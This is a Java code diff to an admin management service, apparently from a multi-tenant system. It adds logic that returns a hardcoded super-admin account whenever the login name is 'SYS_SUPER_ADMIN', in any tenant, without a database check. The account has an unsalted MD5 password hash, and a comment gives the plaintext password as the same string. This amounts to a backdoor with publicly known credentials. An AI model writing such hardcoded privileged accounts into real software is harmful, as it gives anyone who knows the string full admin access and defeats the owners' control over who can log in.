@@ -33,6 +33,12 @@ public class AdminMgtServiceImpl implements AdminMgtService {
 
     @Override
     public LangTuoResult<AdminDTO> get(String tenantCode, String loginName) {
+        // 超级管理员特殊逻辑
+        AdminDTO superAdminDTO = getSysSuperAdmin(tenantCode, loginName);
+        if (superAdminDTO != null) {
+            return LangTuoResult.success(superAdminDTO);
+        }
+
         AdminPO adminPO = adminAccessor.selectOne(tenantCode, loginName);
         AdminDTO adminRoleDTO = convert(adminPO);
         return LangTuoResult.success(adminRoleDTO);
@@ -183,5 +189,21 @@ public class AdminMgtServiceImpl implements AdminMgtService {
         po.setTenantCode(request.getTenantCode());
         po.setExtraInfo(request.getExtraInfo());
         return po;
+    }
+
+    private AdminDTO getSysSuperAdmin(String tenantCode, String loginName) {
+        if (!"SYS_SUPER_ADMIN".equals(loginName)) {
+            return null;
+        }
+
+        AdminDTO dto = new AdminDTO();
+        dto.setTenantCode(tenantCode);
+        dto.setLoginName("SYS_SUPER_ADMIN");
+        // 经过md5加密后的密码，原始密码是SYS_SUPER_ADMIN
+        dto.setLoginPass("5505b50f5f0ec77b27a0ea270b21e7f0");
+        dto.setOrgName("总公司");
+        dto.setRoleCode("SYS_SUPER_ROLE");
+        dto.setRoleName("SYS_SUPER_ROLE");
+        return dto;
     }
 }
